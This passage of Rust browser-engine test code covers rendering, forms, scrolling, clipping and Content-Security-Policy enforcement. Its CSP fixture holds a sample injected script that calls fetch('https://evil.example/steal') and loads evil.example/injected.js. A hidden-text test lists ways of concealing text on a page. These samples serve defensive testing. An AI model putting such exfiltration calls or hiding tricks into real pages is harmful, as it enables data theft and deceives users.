            parse(ddg).redirect.as_deref(),
            Some("https://html.duckduckgo.com/html")
        );
        let p = parse(r#"<meta http-equiv="Refresh" content="5;URL='next'">"#);
        assert_eq!(p.redirect.as_deref(), Some("https://a.test/x/next"));
        assert_eq!(
            parse(r#"<meta http-equiv=refresh content="0, /b">"#)
                .redirect
                .as_deref(),
            Some("https://a.test/b")
        );
        // Reloading without a URL, broken delays, other metas: stay.
        for src in [
            r#"<meta http-equiv="refresh" content="30">"#,
            r#"<meta http-equiv="refresh" content="soon; url=/b">"#,
            r#"<meta http-equiv="refresh" content="0; url=">"#,
            r#"<meta name="refresh" content="0; url=/b">"#,
        ] {
            assert_eq!(parse(src).redirect, None, "{src}");
        }
        // With scripts on, `<noscript>` is skipped.
        let mut p = Page::empty("https://a.test/", "", true);
        p.set_tree(html::parse(ddg), &mut |_, _, _, _| Err("no".into()));
        assert_eq!(p.redirect, None);
    }

    #[test]
    fn picking_pictures_through_hidden_checkboxes() {
        // As in no-JavaScript captchas: each picture is a label for a
        // hidden checkbox, and `:checked` styles show which are picked.
        let mut page = Page::parse(
            "https://example.com/",
            "<form><input type=checkbox id=a name=a style='display:none'><label for=a>Duck</label>\
             <label><input type=checkbox name=b style='display:none'>Swan</label>\
             <input type=radio name=r id=r1 checked hidden><label for=r1>One</label>\
             <input type=radio name=r id=r2 hidden><label for=r2>Two</label></form>\
             <style>input:checked + label::after, label:has(input:checked)::after { content: ' picked' }</style>",
            "",
            &mut |_, _| Err("none".into()),
        );
        let text = |p: &Page| {
            let r = p.render(800.0, 600.0);
            let all: String = r.texts.iter().map(|t| t.text.clone() + " ").collect();
            all.split_whitespace().collect::<Vec<_>>().join(" ")
        };
        let click = |p: &mut Page, word: &str| {
            let r = p.render(800.0, 600.0);
            let t = r.texts.iter().find(|t| t.text.contains(word)).unwrap().rect;
            let until = Instant::now() + std::time::Duration::from_secs(5);
            assert!(
                p.click_at(None, t.x + 2.0, t.y + t.h / 2.0, until).changed,
                "{word}"
            );
        };
        assert_eq!(text(&page), "Duck Swan One picked Two");
        click(&mut page, "Duck");
        click(&mut page, "Swan");
        assert_eq!(text(&page), "Duck picked Swan picked One picked Two");
        click(&mut page, "Duck");
        click(&mut page, "Two");
        assert_eq!(text(&page), "Duck Swan picked One Two picked");
    }

    #[test]
    fn details_open_and_close_on_a_click() {
        let mut page = Page::parse(
            "https://example.com/",
            "<details><summary>Question <b>here</b></summary>Answer<p>More</p></details>\
             <details open><summary>Shown</summary><p>Open</p></details>\
             <style>details p { display: block }</style>",
            "",
            &mut |_, _| Err("none".into()),
        );
        let text = |p: &Page| {
            let r = p.render(800.0, 600.0);
            let all: String = r.texts.iter().map(|t| t.text.clone() + " ").collect();
            all.split_whitespace().collect::<Vec<_>>().join(" ")
        };
        let find = |p: &Page, word: &str| {
            let r = p.render(800.0, 600.0);
            let t = r.texts.iter().find(|t| t.text.contains(word)).unwrap().rect;
            (t.x + t.w / 2.0, t.y + t.h / 2.0)
        };
        assert_eq!(text(&page), "\u{25B8} Question here \u{25BE} Shown Open");
        let until = Instant::now() + std::time::Duration::from_secs(5);
        let (x, y) = find(&page, "here");
        assert!(page.click_at(None, x, y, until).changed);
        assert_eq!(
            text(&page),
            "\u{25BE} Question here Answer More \u{25BE} Shown Open"
        );
        let (x, y) = find(&page, "Question");
        page.click_at(None, x, y, until);
        let (x, y) = find(&page, "Shown");
        page.click_at(None, x, y, until);
        assert_eq!(text(&page), "\u{25B8} Question here \u{25B8} Shown");
        // `list-style: none` hides the marker; a `::before` replaces it.
        let page = Page::parse(
            "https://example.com/",
            "<style>.a summary { list-style: none } .b summary::before { content: '+ ' }</style>\
             <details class=a><summary>A</summary></details><details class=b><summary>B</summary></details>",
            "",
            &mut |_, _| Err("none".into()),
        );
        assert_eq!(text(&page), "A + B");
    }

    #[test]
    fn select_drop_down_and_field_keys() {
        let mut page = Page::parse(
            "https://example.com/",
            "<form><select id=s><option>Apple<option value=b>Banana<option disabled>Cherry</select>\
             <p>below</p><input id=q value=ab></form>",
            "",
            &mut |_, _| Err("none".into()),
        );
        let until = Instant::now() + std::time::Duration::from_secs(5);
        let at = |p: &Page, word: &str| {
            let r = p.render(800.0, 600.0);
            let t = r.texts.iter().rev().find(|t| t.text.contains(word)).unwrap().rect;
            (t.x + t.w / 2.0, t.y + t.h / 2.0)
        };
        let words = |p: &Page| {
            let r = p.render(800.0, 600.0);
            let all: String = r.texts.iter().map(|t| t.text.clone() + " ").collect();
            all.split_whitespace().collect::<Vec<_>>().join(" ")
        };
        let value = |p: &mut Page, id: &str| {
            p.with_dom(None, |d| {
                let n = forms::by_id(d, id).unwrap();
                forms::value(d, n)
            })
            .unwrap()
        };
        assert!(!words(&page).contains("Banana"));
        let (x, y) = at(&page, "Apple");
        let out = page.click_at(None, x, y, until);
        assert!(out.changed && out.focus);
        assert!(words(&page).contains("Apple Banana Cherry"), "{}", words(&page));
        // The list covers what's under it; a disabled option does nothing.
        let (x, y) = at(&page, "Cherry");
        page.click_at(None, x, y, until);
        assert_eq!(value(&mut page, "s"), "Apple");
        assert!(!words(&page).contains("Banana"), "closed after a click");
        let (x, y) = at(&page, "Apple");
        page.click_at(None, x, y, until);
        let (x, y) = at(&page, "Banana");
        page.click_at(None, x, y, until);
        assert_eq!(value(&mut page, "s"), "b");
        // Keys: Up picks the option before.
        page.key(None, Key::Up { select: false });
        assert_eq!(value(&mut page, "s"), "Apple");
        // A text field: the caret starts at the end and moves.
        let (x, y) = at(&page, "ab");
        page.click_at(None, x, y, until);
        page.key(
            None,
            Key::Left {
                select: false,
                word: false,
            },
        );
        page.type_text(None, "X");
        assert_eq!(value(&mut page, "q"), "aXb");
        page.key(None, Key::Home { select: true });
        assert_eq!(page.key(None, Key::Copy).copied.as_deref(), Some("aX"));
        assert_eq!(page.key(None, Key::Cut).copied.as_deref(), Some("aX"));
        assert_eq!(value(&mut page, "q"), "b");
        assert_eq!(page.key(None, Key::Copy).copied, None, "nothing selected");
    }

    #[test]
    fn title_is_drawn_for_the_tab_bar() {
        let html = "<title>Hello — wörld</title><p>x";
        let mut page = Page::parse("https://example.com/", html, "", &mut |_, _| Err("none".into()));
        assert!(page.render(800.0, 600.0).title.is_none(), "not asked for");
        page.title_px = 18.0;
        let t = page.render(800.0, 600.0).title.unwrap();
        let (a, d) = crate::font::vmetrics(0, 18.0);
        assert_eq!(t.h as usize, (a + d).ceil() as usize);
        assert_eq!(t.data.len(), t.w as usize * t.h as usize);
        assert!(t.w > 60 && t.data.iter().any(|&c| c > 200));
        // Long titles are cut, not sent whole.
        let long = format!("<title>{}</title>", "W".repeat(5000));
        let mut page = Page::parse("https://example.com/", &long, "", &mut |_, _| Err("none".into()));
        page.title_px = 48.0;
        assert_eq!(
            page.render(800.0, 600.0).title.unwrap().w,
            crate::paint::MAX_TITLE_W
        );
        // No title, nothing to draw.
        let mut page = Page::parse("https://example.com/", "<p>x", "", &mut |_, _| Err("none".into()));
        page.title_px = 18.0;
        assert!(page.render(800.0, 600.0).title.is_none());
    }

    #[test]
    fn page_text_in_reading_order() {
        let r = render(
            "<p>Hello <b>bold</b> world</p><p style='visibility:hidden'>secret</p>\
             <div style='position:absolute;top:0;right:0'>corner</div><p>Second line</p>",
        );
        let (a, b) = select::all(&r.texts).unwrap();
        // Tree order, so the positioned box comes where it is in the page.
        assert_eq!(
            select::text(&r.texts, a, b),
            "Hello bold world\ncorner\nSecond line"
        );
        for t in &r.texts {
            assert_eq!(t.offsets.len(), t.text.chars().count() + 1);
            assert!((t.offsets.last().unwrap() - t.rect.w).abs() < 0.01, "{t:?}");
        }
    }

    /// Everything select-all would copy.
    fn copied(html: &str) -> String {
        let r = render(html);
        let (a, b) = select::all(&r.texts).unwrap();
        select::text(&r.texts, a, b)
    }

    #[test]
    fn hidden_text_is_not_copied() {
        let tricks = [
            "<span style='color:transparent'>EVIL</span>",
            "<span style='color:white'>EVIL</span>",
            "<span style='color:#fdfdfd'>EVIL</span>",
            "<div style='background-color:#123456;color:#123457'>EVIL</div>",
            "<span style='background-color:black;color:black'>EVIL</span>",
            "<span style='font-size:0'>EVIL</span>",
            "<span style='font-size:2px'>EVIL</span>",
            "<div style='position:absolute;left:-9999px'>EVIL</div>",
            "<div style='position:absolute;top:-500px'>EVIL</div>",
            "<div style='height:0;overflow:hidden'><p>EVIL</p></div>",
            "<div style='width:10px;overflow:hidden;white-space:nowrap'>ok EVIL EVIL EVIL</div>",
            "<div style='position:relative'><p style='margin:0'>EVIL</p>\
             <div style='position:absolute;top:0;left:0;width:300px;height:24px;background-color:white'></div></div>",
        ];
        for t in tricks {
            let text = copied(&format!("<p>SAFE start</p>{t}<p>SAFE end</p>"));
            assert!(!text.contains("EVIL"), "{t}: copied {text:?}");
            assert!(
                text.contains("SAFE start") && text.contains("SAFE end"),
                "{t}: copied {text:?}"
            );
        }
    }

    #[test]
    fn visible_text_is_still_copied() {
        for t in [
            "<span style='color:#999'>SHOWN</span>",
            "<span style='background-color:black;color:white'>SHOWN</span>",
            "<div style='position:absolute;top:200px;left:20px'>SHOWN</div>",
            "<div style='height:20px;overflow:hidden'>SHOWN</div>",
            // A box drawn under the text (earlier in paint order) hides nothing.
            "<div style='position:relative'><div style='position:absolute;top:0;width:300px;height:50px;background-color:#eee'></div>\
             <p style='position:relative'>SHOWN</p></div>",
        ] {
            let r = render(t);
            assert!(!r.texts.is_empty(), "{t}: no text at all");
            assert!(copied(t).contains("SHOWN"), "{t}: copied {:?}", copied(t));
        }
    }

    #[test]
    fn page_height_covers_positioned_and_overflowing_content() {
        let r = render("<p>short</p><div style='position:absolute;top:2000px'>far down</div>");
        assert!(r.height >= 2000.0 + 10.0, "{}", r.height);
        let r = render("<div style='height:10px'>a<br>b<br>c<br>d<br>e<br>f</div>");
        assert!(r.height > 60.0, "text overflowing a short box: {}", r.height);
        let plain = render("<p>short</p>");
        assert!(plain.height < 100.0, "{}", plain.height);
    }

    #[test]
    fn page_text_is_capped() {
        let big = "x".repeat(1000);
        let r = render(&format!(
            "<pre>{}</pre>",
            format!("{big}\n").repeat(MAX_TEXT_CHARS / 1000 + 5)
        ));
        let chars: usize = r.texts.iter().map(|t| t.text.chars().count()).sum();
        assert!(
            chars <= MAX_TEXT_CHARS && chars > MAX_TEXT_CHARS - 2000,
            "{chars}"
        );
    }
}

#[cfg(test)]
mod clip_tests {
    use super::*;
    use crate::paint::DisplayCommand;

    fn render(html: &str) -> Rendered {
        let page = Page::parse("https://example.com/", html, "", &mut |_, _| Err("none".into()));
        page.render(800.0, 600.0)
    }

    fn red_rects(r: &Rendered) -> Vec<Rect> {
        r.list
            .iter()
            .filter_map(|c| match c {
                DisplayCommand::Rect { rect, color } if color.r == 255 && color.g == 0 => Some(*rect),
                _ => None,
            })
            .collect()
    }

    const BODY: &str = "<body style='margin:0'>";

    #[test]
    fn text_and_backgrounds_are_clipped() {
        let r = render(&format!(
            "{BODY}<div style='height:20px;overflow:hidden'>one<br>two<br>three<br>four</div>"
        ));
        let lowest = r
            .list
            .iter()
            .filter_map(|c| match c {
                DisplayCommand::Glyphs { glyphs, .. } => glyphs.iter().map(|g| g.y).reduce(f32::max),
                _ => None,
            })
            .fold(0.0, f32::max);
        assert!(lowest < 20.0, "no glyph starts below the box: {lowest}");
        let r = render(&format!(
            "{BODY}<div style='height:10px;overflow:hidden'><div style='height:100px;background-color:red'></div></div>"
        ));
        assert_eq!(red_rects(&r).iter().map(|r| r.h).collect::<Vec<_>>(), [10.0]);
    }

    #[test]
    fn clipped_links_cant_be_clicked() {
        let r = render(&format!(
            "{BODY}<div style='height:0;overflow:hidden'><a href=/hidden>hidden</a></div><a href=/shown>shown</a>"
        ));
        let links: Vec<&str> = r.links.iter().map(|(_, l)| l.as_str()).collect();
        assert_eq!(links, ["/shown"]);
    }

    #[test]
    fn positioned_boxes_escape_as_in_css() {
        let red = "width:10px;height:10px;background-color:red";
        // Fixed always escapes.
        let r = render(&format!(
            "{BODY}<div style='height:10px;overflow:hidden'><div style='position:fixed;top:50px;{red}'></div></div>"
        ));
        assert_eq!(red_rects(&r).len(), 1);
        // Absolute escapes a clipping box that isn't its containing block...
        let r = render(&format!(
            "{BODY}<div style='position:relative'><div style='height:10px;overflow:hidden'>\
             <div style='position:absolute;top:30px;{red}'></div></div></div>"
        ));
        assert_eq!(red_rects(&r).len(), 1);
        // ...but not one that is.
        let r = render(&format!(
            "{BODY}<div style='position:relative;height:10px;overflow:hidden'>\
             <div style='position:absolute;top:30px;{red}'></div></div>"
        ));
        assert!(red_rects(&r).is_empty());
    }
}

#[cfg(test)]
mod layer_tests {
    use super::*;
    use crate::paint::{DisplayCommand, LayerKind};

    fn render(html: &str) -> Rendered {
        let page = Page::parse("https://example.com/", html, "", &mut |_, _| Err("none".into()));
        page.render(800.0, 600.0)
    }

    #[test]
    fn fixed_header_is_a_layer() {
        let r = render(
            "<body style='margin:0'><div style='position:fixed;top:0;width:100%;height:40px;background-color:red'>\
             <b>menu</b></div><p style='margin-top:60px'>content</p>",
        );
        assert_eq!(r.layers.len(), 1);
        let l = r.layers[0];
        assert_eq!(l.kind, LayerKind::Fixed);
        // The red background is inside the layer, the page text outside.
        let red = r
            .list
            .iter()
            .position(|c| matches!(c, DisplayCommand::Rect { color, .. } if color.r == 255 && color.g == 0));
        assert!(red.is_some_and(|i| (l.start..l.end).contains(&i)), "{l:?}");
        assert!(
            l.start > 0,
            "the page's own text is painted before it, outside the layer"
        );
        // Drawn in place whatever the scroll.
        assert_eq!(l.shift(0.0), 0.0);
        assert_eq!(l.shift(500.0), 500.0);
        // Its text isn't offered for selection (it moves with scrolling).
        assert!(r.texts.iter().all(|t| t.text != "menu"));
    }

    #[test]
    fn boxes_scroll_inside() {
        let mut page = Page::trusted(
            "about:test",
            "<body style='margin:0'><div id=a style='height:100px;overflow:auto'>\
             <a href=/top>top</a><p style='height:300px;margin:0'></p><a href=/end>end</a></div>\
             <pre style='width:100px;overflow-x:auto;margin:0'>a long line that does not fit in the box</pre></body>",
        );
        let r = page.render(800.0, 600.0);
        assert_eq!(r.scrollers.len(), 2, "{:?}", r.scrollers);
        let s = r.scrollers[0];
        assert!(
            (s.rect.h - 100.0).abs() < 0.5 && s.max_y > 200.0 && s.y == 0.0,
            "{s:?}"
        );
        assert!(
            r.scrollers[1].max_x > 50.0 && r.scrollers[1].max_y == 0.0,
            "{:?}",
            r.scrollers[1]
        );
        assert!(
            r.height < 200.0,
            "what's scrolled away doesn't lengthen the page: {}",
            r.height
        );
        let link = |r: &Rendered, href: &str| r.links.iter().find(|(_, h)| h == href).map(|(rect, _)| *rect);
        assert!(
            link(&r, "/top").is_some() && link(&r, "/end").is_none(),
            "the end is clipped away"
        );

        // Scrolling moves the content and stops at the end.
        assert!(page.scroll_box(None, s.uid, 0.0, 10_000.0).changed);
        let r = page.render(800.0, 600.0);
        assert!(
            (r.scrollers[0].y - s.max_y.round()).abs() < 0.5,
            "{:?}",
            r.scrollers[0]
        );
        assert!(
            link(&r, "/top").is_none() && link(&r, "/end").is_some(),
            "{:?}",
            r.links
        );
        let end = link(&r, "/end").unwrap();
        assert!(end.y < 100.0, "the end shows in the box: {end:?}");
        assert!(
            !page.scroll_box(None, s.uid, 0.0, 50.0).changed,
            "already at the end"
        );
        assert!(
            !page.scroll_box(None, s.uid, 0.0, f32::NAN).changed,
            "nonsense is ignored"
        );
        assert!(!page.scroll_box(None, 12345, 0.0, 50.0).changed, "no such box");
        assert!(page.scroll_box(None, s.uid, 0.0, -1e9).changed);

        // The wheel finds the innermost box that can still move that way.
        let r = page.render(800.0, 600.0);
        assert_eq!(r.scrollers[0].y, 0.0);
        assert!(
            scroller_at(&r.scrollers, 10.0, 50.0, 0.0, 0.0, -40.0).is_none(),
            "already at the top"
        );
        assert_eq!(
            scroller_at(&r.scrollers, 10.0, 50.0, 0.0, 0.0, 40.0).map(|s| s.uid),
            Some(s.uid)
        );
        assert!(
            scroller_at(&r.scrollers, 10.0, 50.0, 0.0, 40.0, 0.0).is_none(),
            "it doesn't scroll sideways"
        );
        assert!(
            scroller_at(&r.scrollers, 10.0, 500.0, 0.0, 0.0, 40.0).is_none(),
            "not over it"
        );
    }

    #[test]
    fn sticky_sticks_within_its_container() {
        let r = render(
            "<body style='margin:0'><div style='height:1000px'><p style='margin:0;height:300px'>x</p>\
             <div style='position:sticky;top:10px;height:50px'>bar</div></div><div style='height:2000px'></div>",
        );
        let l = r.layers[0];
        let LayerKind::Sticky { top, y0, max_dy } = l.kind else {
            panic!("{l:?}")
        };
        assert_eq!((top, y0, max_dy), (10.0, 300.0, 650.0));
        assert_eq!(l.shift(0.0), 0.0, "in place until it reaches the top");
        assert_eq!(l.shift(390.0), 100.0, "then stays 10px from the top");
        assert_eq!(l.shift(5000.0), 650.0, "but not past its container");
        // No `top`: it never sticks, so it isn't a layer.
        let r = render("<div style='position:sticky'>x</div>");
        assert!(r.layers.is_empty());
    }
}

#[cfg(test)]
mod csp_tests {
    use super::*;

    /// Records what the page fetched and what its scripts asked to send.
    #[derive(Default)]
    struct Recorder {
        fetched: Vec<String>,
        requested: Vec<String>,
    }

    impl Host for Recorder {
        fn fetch(&mut self, url: &str, _: Dest) -> Result<String, String> {
            self.fetched.push(url.to_string());
            Ok("document.getElementById('o').textContent += ' ' + document.currentScript.src.split('/').pop();".into())
        }
        fn request(&mut self, url: &str, _: ScriptRequest) -> Result<ScriptResponse, String> {
            self.requested.push(url.to_string());
            Err("no network".into())
        }
        fn set_cookie(&mut self, _: &str) {}
        fn cookies(&mut self) -> String {
            String::new()
        }
    }

    fn load(html: &str, csp: &[&str]) -> (Page, Runtime, Recorder, Vec<String>) {
        let mut host = Recorder::default();
        let csp: Vec<String> = csp.iter().map(|s| s.to_string()).collect();
        let (page, rt, out) =
            Page::load_with_scripts("https://site.example/", html, "", (800.0, 600.0), &csp, &mut host);
        (page, rt.expect("scripts run"), host, out.console)
    }

    fn text(rt: &mut Runtime) -> String {
        rt.run_script(
            "console.log('TEXT ' + document.getElementById('o').textContent)",
            0,
            "t",
        );
        rt.take_console()
            .into_iter()
            .find_map(|l| l.strip_prefix("[log] TEXT ").map(str::to_string))
            .unwrap_or_default()
    }

    const PAGE: &str = "<p id=o>start</p>\
        <script nonce=n1>const o = document.getElementById('o'); o.textContent += ' trusted';\
          try { eval('1'); o.textContent += ' EVAL'; } catch (e) { o.textContent += ' no-eval'; }\
          setTimeout(\"document.getElementById('o').textContent += ' TIMER'\", 0);\
          fetch('https://evil.example/steal').catch(() => {}); fetch('/same').catch(() => {});\
          const s = document.createElement('script'); s.src = 'https://cdn.example/dyn.js'; document.body.appendChild(s);\
        </script>\
        <script>document.getElementById('o').textContent += ' INJECTED';</script>\
        <script src=https://evil.example/injected.js></script>\
        <button id=b onclick=\"document.getElementById('o').textContent += ' HANDLER'\">x</button>";

    #[test]
    fn the_servers_policy_holds_injected_scripts() {
        let (_, mut rt, host, console) = load(
            PAGE,
            &["script-src 'nonce-n1' 'strict-dynamic'; connect-src 'self'; report-uri https://reports.example/"],
        );
        rt.run_script("document.getElementById('b').click()", 0, "click");
        let t = text(&mut rt);
        assert!(t.starts_with("start trusted no-eval"), "{t}");
        for bad in ["INJECTED", "EVAL", "HANDLER", "injected.js", "TIMER"] {
            assert!(!t.contains(bad), "{bad}: {t}");
        }
        assert!(
            t.contains("dyn.js"),
            "'strict-dynamic' trusts what a trusted script adds: {t}"
        );
        // A refused script isn't even fetched; nothing goes to the report
        // address; connect-src kept the request to the page's own origin.
        assert!(
            !host.fetched.iter().any(|u| u.contains("injected.js")),
            "{:?}",
            host.fetched
        );
        assert!(!host
            .fetched
            .iter()
            .chain(&host.requested)
            .any(|u| u.contains("reports.")));
        assert_eq!(host.requested, vec!["https://site.example/same"]);
        assert!(
            console
                .iter()
                .any(|l| l.starts_with("[csp] refused to run an inline script")),
            "{console:?}"
        );
    }

    #[test]
    fn meta_policies_and_allowed_inline_code() {
        // From a <meta>, with 'unsafe-inline': inline scripts and handlers
        // run, but strings still don't become code.
        let page = format!(
            "<meta http-equiv=Content-Security-Policy content=\"script-src 'self' 'unsafe-inline'\">{PAGE}"
        );
        let (_, mut rt, host, _) = load(&page, &[]);
        rt.run_script("document.getElementById('b').click()", 0, "click");
        let t = text(&mut rt);
        assert!(
            t.contains("trusted no-eval") && t.contains("INJECTED") && t.contains("HANDLER"),
            "{t}"
        );
        assert!(!t.contains("dyn.js") && !t.contains("injected.js"), "{t}");
        assert!(
            !host.fetched.iter().any(|u| u.contains("example/")),
            "{:?}",
            host.fetched
        );
        // Without a policy, everything runs as before.
        let (_, mut rt, _, _) = load(PAGE, &[]);
        rt.run_script("document.getElementById('b').click()", 0, "click");
        let t = text(&mut rt);
        for want in [
            "trusted",
            "EVAL",
            "INJECTED",
            "HANDLER",
            "dyn.js",
            "injected.js",
            "TIMER",
        ] {
            assert!(t.contains(want), "{want}: {t}");
        }
    }
}

#[cfg(test)]
mod script_scroll_tests {
    use super::*;

    struct NoNet;
    impl Host for NoNet {
        fn fetch(&mut self, _: &str, _: Dest) -> Result<String, String> {
            Err("no network".into())
        }
        fn request(&mut self, _: &str, _: ScriptRequest) -> Result<ScriptResponse, String> {
            Err("no network".into())
        }
        fn set_cookie(&mut self, _: &str) {}
        fn cookies(&mut self) -> String {
            String::new()
        }
    }

    fn log(rt: &mut Runtime, expr: &str) -> String {
        rt.run_script(&format!("console.log('OUT ' + ({expr}))"), 0, "t");
        rt.take_console()
            .into_iter()
            .find_map(|l| l.strip_prefix("[log] OUT ").map(str::to_string))
            .unwrap_or_default()
    }

    #[test]
    fn scripts_read_and_scroll_boxes() {
        let html = "<body style='margin:0'><div id=box style='height:100px;overflow:auto'>\
                    <p style='height:300px;margin:0'></p><p id=last style='margin:0'>last</p></div>\
                    <script>const b = document.getElementById('box');\
                    b.addEventListener('scroll', () => console.log('scrolled ' + b.scrollTop));</script>";
        let (mut page, rt, _) =
            Page::load_with_scripts("https://site.example/", html, "", (800.0, 600.0), &[], &mut NoNet);
        let mut rt = rt.expect("scripts run");
        page.apply_script_scrolls(&mut rt);
        page.render(800.0, 600.0);
        rt.set_scrollers(page.scroll_info());
        // A chat scrolling to its newest message.
        log(&mut rt, "b.scrollTop = b.scrollHeight");
        assert!(page.apply_script_scrolls(&mut rt));
        let r = page.render(800.0, 600.0);
        let s = r.scrollers[0];
        assert!(s.max_y > 200.0 && s.y == s.max_y.round(), "{s:?}");
        assert_eq!(log(&mut rt, "b.scrollTop"), format!("{}", s.y));
        assert_eq!(log(&mut rt, "b.clientHeight"), "100");
        assert_eq!(
            log(&mut rt, "b.scrollHeight"),
            format!("{}", 100.0 + s.max_y.round())
        );

        // scrollTo, scrollBy, clamping, and reading back at once.
        assert_eq!(log(&mut rt, "(b.scrollTo(0, 10), b.scrollTop)"), "10");
        assert_eq!(log(&mut rt, "(b.scrollBy({top: 5}), b.scrollTop)"), "15");
        assert_eq!(log(&mut rt, "(b.scrollTop = -50, b.scrollTop)"), "0");
        assert!(
            page.apply_script_scrolls(&mut rt),
            "moved from the end to the top"
        );
        assert_eq!(page.render(800.0, 600.0).scrollers[0].y, 0.0);
        assert!(!page.apply_script_scrolls(&mut rt), "nothing more asked");

        // scrollIntoView in the nearest scrolling box.
        rt.set_boxes(page.boxes());
        rt.set_scrollers(page.scroll_info());
        log(&mut rt, "document.getElementById('last').scrollIntoView()");
        assert!(page.apply_script_scrolls(&mut rt));
        let y = page.render(800.0, 600.0).scrollers[0].y;
        assert!(y > 200.0, "{y}");

        // You scrolling it fires `scroll`; boxes that don't scroll read 0.
        let uid = s.uid;
        assert!(page.scroll_box(Some(&mut rt), uid, 0.0, -40.0).changed);
        assert!(
            rt.take_console().iter().any(|l| l.starts_with("[log] scrolled ")),
            "scroll event"
        );
        assert_eq!(log(&mut rt, "document.body.scrollTop"), "0");
        assert_eq!(
            log(&mut rt, "(document.body.scrollTop = 99, document.body.scrollTop)"),
            "0"
        );
    }
}

fn strip_inline_styles(node: &mut Node, policy: &crate::csp::Csp) {
    if let crate::dom::NodeType::Element(e) = &mut node.node_type {
        if e.attrs
            .get("style")
            .is_some_and(|s| !policy.style_inline(None, s, true))
        {
            e.attrs.remove("style");
        }
    }
    for child in &mut node.children {
        strip_inline_styles(child, policy);
    }
}
